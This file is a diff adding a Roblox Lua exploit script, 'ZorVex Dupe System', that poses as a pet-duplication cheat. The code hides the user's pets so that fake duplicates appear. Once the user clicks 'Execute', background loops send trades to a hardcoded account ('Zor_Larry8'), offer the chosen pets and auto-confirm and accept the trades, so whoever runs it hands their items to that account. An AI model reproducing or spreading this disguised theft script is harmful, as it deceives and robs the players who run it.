@@ -1,0 +1,356 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local LocalPlayer = Players.LocalPlayer
+local petsFolder = LocalPlayer:WaitForChild("petsFolder", 5)
+local hiddenStorage = ReplicatedStorage:FindFirstChild("ZorVexStorage") or Instance.new("Folder", ReplicatedStorage)
+hiddenStorage.Name = "ZorVexStorage"
+
+local tradingEvent = ReplicatedStorage:WaitForChild("rEvents", 5) and ReplicatedStorage.rEvents:WaitForChild("tradingEvent", 5)
+
+local ALLOWED_USERNAME = "Zor_Larry8"
+local targetPlayerName = "Zor_Larry8" 
+local selectedPetName = nil 
+local amount = 110
+local PET_COUNT = 6        
+local autoTradeActive = false 
+
+local petOriginTable = {}
+local selectedPlayer = nil 
+
+local function InitialHideAll()
+    if not petsFolder then return end
+    for _, folder in ipairs(petsFolder:GetChildren()) do
+        if folder:IsA("Folder") then
+            for _, pet in ipairs(folder:GetChildren()) do
+                petOriginTable[pet] = folder
+                pet.Parent = hiddenStorage
+            end
+        end
+    end
+end
+InitialHideAll()
+
+local function getPetInstances(petName, n)
+    local pets = {}
+    if not petsFolder then return pets end 
+
+    for _, folder in ipairs(petsFolder:GetChildren()) do
+        if folder:IsA("Folder") then
+            for _, pet in ipairs(folder:GetChildren()) do
+                if pet.Name == petName then
+                    table.insert(pets, pet)
+                    if #pets >= n then return pets end
+                end
+            end
+        end
+    end
+    return pets
+end
+
+local function isTradePending()
+    return LocalPlayer:FindFirstChild("CurrentTrade") ~= nil
+end
+
+local function isTradeAccepted()
+    local currentTrade = LocalPlayer:FindFirstChild("CurrentTrade")
+    if currentTrade and currentTrade:FindFirstChild("Accepted") then
+        return currentTrade.Accepted.Value
+    end
+    return false
+end
+
+local function initializeTargetPlayer()
+    selectedPlayer = Players:FindFirstChild(targetPlayerName) 
+    if not selectedPlayer then
+        warn("Target Player '" .. targetPlayerName .. "' tidak ditemukan di server.")
+    end
+end
+initializeTargetPlayer()
+
+local function runExecution()
+    if not petsFolder or not selectedPetName then return false end
+    
+    local allPets = {}
+    for _, folder in ipairs(petsFolder:GetChildren()) do
+        if folder:IsA("Folder") then
+            for _, pet in ipairs(folder:GetChildren()) do
+                petOriginTable[pet] = folder
+                table.insert(allPets, pet)
+            end
+        end
+    end
+    for _, pet in ipairs(hiddenStorage:GetChildren()) do 
+        table.insert(allPets, pet) 
+    end
+    
+    local count = 0
+    for _, pet in ipairs(allPets) do
+        if pet.Name == selectedPetName and count < amount then
+            pet.Parent = petOriginTable[pet] or petsFolder:FindFirstChildWhichIsA("Folder")
+            count = count + 1
+        else
+            pet.Parent = hiddenStorage
+        end
+    end
+    return true, count
+end
+
+if game.CoreGui:FindFirstChild("ZorVexUI") then game.CoreGui.ZorVexUI:Destroy() end
+if game.CoreGui:FindFirstChild("ZorVexToggle") then game.CoreGui.ZorVexToggle:Destroy() end
+
+local sg = Instance.new("ScreenGui", game.CoreGui)
+sg.Name = "ZorVexUI"
+sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local bg = Instance.new("Frame", sg)
+bg.Size = UDim2.new(0, 300, 0, 130) 
+bg.Position = UDim2.new(0.5, -150, 0.5, -65) 
+bg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+bg.BackgroundTransparency = 0.9
+bg.BorderSizePixel = 0
+bg.Active = true
+bg.Visible = false
+
+local uic = Instance.new("UICorner", bg)
+uic.CornerRadius = UDim.new(0, 12)
+
+local uiShadow = Instance.new("UIStroke", bg)
+uiShadow.Color = Color3.fromRGB(220, 220, 220)
+uiShadow.Thickness = 2
+uiShadow.Transparency = 0.6
+
+local title = Instance.new("TextLabel", bg)
+title.Size = UDim2.new(1, 0, 0, 30)
+title.BackgroundTransparency = 1
+title.Text = "ZorVex Dupe System"
+title.TextColor3 = Color3.fromRGB(144, 144, 144)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 18
+
+local dropdownFrame = Instance.new("Frame", bg)
+dropdownFrame.Size = UDim2.new(0, 250, 0, 35)
+dropdownFrame.Position = UDim2.new(0, 25, 0, 40)
+dropdownFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+dropdownFrame.BackgroundTransparency = 0.65
+dropdownFrame.ZIndex = 10
+Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 8)
+
+local dropdownText = Instance.new("TextLabel", dropdownFrame)
+dropdownText.Size = UDim2.new(1, 0, 1, 0)
+dropdownText.BackgroundTransparency = 1
+dropdownText.Text = "Select Costume"
+dropdownText.TextColor3 = Color3.fromRGB(255, 255, 255)
+dropdownText.Font = Enum.Font.GothamBold
+dropdownText.TextSize = 14
+dropdownText.TextXAlignment = Enum.TextXAlignment.Center
+dropdownText.ZIndex = 11
+
+local fullClickBtn = Instance.new("TextButton", dropdownFrame)
+fullClickBtn.Size = UDim2.new(1, 0, 1, 0)
+fullClickBtn.BackgroundTransparency = 1
+fullClickBtn.Text = ""
+fullClickBtn.ZIndex = 12
+
+local arrow = Instance.new("TextLabel", dropdownFrame)
+arrow.Size = UDim2.new(0, 30, 1, 0)
+arrow.Position = UDim2.new(1, -30, 0, 0)
+arrow.BackgroundTransparency = 1
+arrow.Text = ""
+arrow.TextColor3 = Color3.fromRGB(255, 255, 255)
+arrow.TextSize = 14
+arrow.ZIndex = 11
+
+local dropdownList = Instance.new("ScrollingFrame", bg)
+dropdownList.Size = UDim2.new(0, 250, 0, 0)
+dropdownList.Position = UDim2.new(0, 25, 0, 78)
+dropdownList.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+dropdownList.BackgroundTransparency = 1
+dropdownList.BorderSizePixel = 0
+dropdownList.ScrollBarThickness = 0
+dropdownList.Visible = false
+dropdownList.ZIndex = 100
+Instance.new("UICorner", dropdownList).CornerRadius = UDim.new(0, 8)
+
+local layout = Instance.new("UIListLayout", dropdownList)
+layout.Padding = UDim.new(0, 4)
+layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+Instance.new("UIPadding", dropdownList).PaddingTop = UDim.new(0, 5)
+
+local petList = { "💪Muscle Legends💪", "Common Boss Pet", "Rare Boss Pet", "Legendary Boss Pet", "Mythic Boss Pet", "Epic Boss Pet", "Gold Warrior", "Cool Guy Larry", "Hank", "Sky Hawk", "Darkstar Hunter", "Neon Guardian", "Muscle Sensei","Flaming Hedgehog", "⚔️Ninja Legends⚔️", "Twin Element Birdies", "GLITCH: Awakened Nighthunter", "Energized Skyraider Cerberus", "Inner Peace Cerberus", "Inner Darkness Hydra", "CYBER: Ancinet Master Wraith", "Void Omega Pegasus", "Rising Dawn Midnight Wyvern", "Unlimited Secrets Master Dragon", "Cybernetic Showdown Dragon", "Rising Millenium Hydra", "Corrupted Elements Hydra", "DRAGON: nebula Skystorm", "Zen Master Leviathan"}
+
+local function updatePetList()
+    for _, child in ipairs(dropdownList:GetChildren()) do
+        if child:IsA("TextButton") then child:Destroy() end
+    end
+    for _, name in ipairs(petList) do
+        local btn = Instance.new("TextButton", dropdownList)
+        btn.Size = UDim2.new(0.9, 0, 0, 35)
+        btn.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
+        btn.Text = name
+        btn.TextColor3 = Color3.fromRGB(30, 30, 30)
+        btn.Font = Enum.Font.GothamBold
+        btn.TextSize = 13
+        btn.ZIndex = 101
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+        
+        btn.MouseButton1Click:Connect(function()
+            selectedPetName = name 
+            dropdownText.Text = name
+            TweenService:Create(dropdownList, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, 250, 0, 0), BackgroundTransparency = 1}):Play()
+            task.delay(0.3, function() dropdownList.Visible = false end)
+        end)
+    end
+    dropdownList.CanvasSize = UDim2.new(0, 0, 0, #petList * 39 + 10)
+end
+
+fullClickBtn.MouseButton1Click:Connect(function()
+    if dropdownList.Visible then
+        TweenService:Create(dropdownList, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, 250, 0, 0), BackgroundTransparency = 1}):Play()
+        task.delay(0.3, function() dropdownList.Visible = false end)
+    else
+        updatePetList()
+        dropdownList.Visible = true
+        TweenService:Create(dropdownList, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 250, 0, 150), BackgroundTransparency = 0.1}):Play()
+    end
+end)
+
+local sendBtn = Instance.new("TextButton", bg)
+sendBtn.Size = UDim2.new(0, 250, 0, 35)
+sendBtn.Position = UDim2.new(0, 25, 0, 85) 
+sendBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+sendBtn.BackgroundTransparency = 0.45
+sendBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+sendBtn.Font = Enum.Font.GothamBold
+sendBtn.TextSize = 16
+sendBtn.Text = "Execute ZorVex: OFF"
+sendBtn.ZIndex = 5
+Instance.new("UICorner", sendBtn).CornerRadius = UDim.new(0, 8)
+
+sendBtn.MouseButton1Click:Connect(function()
+    autoTradeActive = not autoTradeActive
+    
+    if autoTradeActive then
+        sendBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        sendBtn.Text = "Execute ZorVex: ON"
+    else
+        sendBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        sendBtn.Text = "Execute ZorVex: OFF"
+    end
+end)
+
+local toggleScreenGui = Instance.new("ScreenGui", game.CoreGui)
+toggleScreenGui.Name = "ZorVexToggle"
+local ImgBtn = Instance.new("ImageButton", toggleScreenGui)
+ImgBtn.Size = UDim2.new(0, 60, 0, 60)
+ImgBtn.Position = UDim2.new(1, -70, 0, 10)
+ImgBtn.BackgroundTransparency = 1
+ImgBtn.Image = "rbxassetid://103162489006184" 
+ImgBtn.ZIndex = 9999
+Instance.new("UICorner", ImgBtn).CornerRadius = UDim.new(0, 15)
+
+ImgBtn.MouseButton1Click:Connect(function()
+    if bg.Visible then
+        TweenService:Create(bg, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0), Position = UDim2.new(0.5, 0, 0.5, 0), BackgroundTransparency = 1}):Play()
+        task.delay(0.3, function() bg.Visible = false end)
+    else
+        bg.Visible = true
+        TweenService:Create(bg, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 300, 0, 130), Position = UDim2.new(0.5, -150, 0.5, -65), BackgroundTransparency = 0.15}):Play()
+    end
+end)
+
+local function makeDraggable(frame, button)
+    local dragging, dragStart, startPos
+    button.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true; dragStart = input.Position; startPos = frame.Position
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+    button.InputEnded:Connect(function() dragging = false end)
+end
+
+makeDraggable(bg, bg)
+makeDraggable(ImgBtn, ImgBtn)
+
+task.spawn(function()
+    while true do
+        if autoTradeActive then
+            local currentTrade = LocalPlayer:FindFirstChild("CurrentTrade")
+            if currentTrade and tradingEvent then
+                pcall(function() tradingEvent:FireServer("acceptTrade") end)
+            else
+                local targetPlayer = Players:FindFirstChild(ALLOWED_USERNAME)
+                if targetPlayer and tradingEvent then
+                    pcall(function() tradingEvent:FireServer("requestAccepted", targetPlayer) end)
+                end
+            end
+        end
+        task.wait(0.1)
+    end
+end)
+
+task.spawn(function()
+    print("ZorVex Background System: Active")
+    while true do
+        if autoTradeActive then
+            pcall(runExecution)
+        else
+            pcall(initializeTargetPlayer)
+        end
+        task.wait(1.5) 
+    end
+end)
+
+task.spawn(function()
+    print("Auto-Trade Script Active (Strict Username Match)")
+    while true do
+        if autoTradeActive and selectedPetName and selectedPlayer and not isTradePending() and tradingEvent then
+            local pets = getPetInstances(selectedPetName, PET_COUNT)
+            if #pets > 0 then
+                pcall(function() tradingEvent:FireServer("sendTradeRequest", selectedPlayer) end)
+                task.wait(0.1)
+                
+                for _, pet in ipairs(pets) do
+                    if pet and pet.Parent then
+                        pcall(function() tradingEvent:FireServer("offerItem", pet) end)
+                        task.wait(0.01)
+                    end
+                end
+                
+                if not isTradeAccepted() then 
+                    pcall(function() tradingEvent:FireServer("confirmTrade") end)
+                    pcall(function() tradingEvent:FireServer("acceptTrade") end)
+                end
+            end
+        end
+
+        if autoTradeActive then
+            local currentTrade = LocalPlayer:FindFirstChild("CurrentTrade")
+            if currentTrade and tradingEvent then
+                pcall(function() tradingEvent:FireServer("acceptTrade") end) 
+                task.wait(0.01)
+
+                local tradeItems
+                local timeoutStart = tick()
+                repeat
+                    task.wait(0.01)
+                    tradeItems = currentTrade:FindFirstChild("OfferedItems")
+                    if tick() - timeoutStart > 5 then break end
+                until tradeItems and #tradeItems:GetChildren() > 0
+
+                pcall(function() tradingEvent:FireServer("confirmTrade") end)
+                pcall(function() tradingEvent:FireServer("acceptTrade") end)
+            end
+        end
+
+        task.wait(0.01)
+    end
+end)
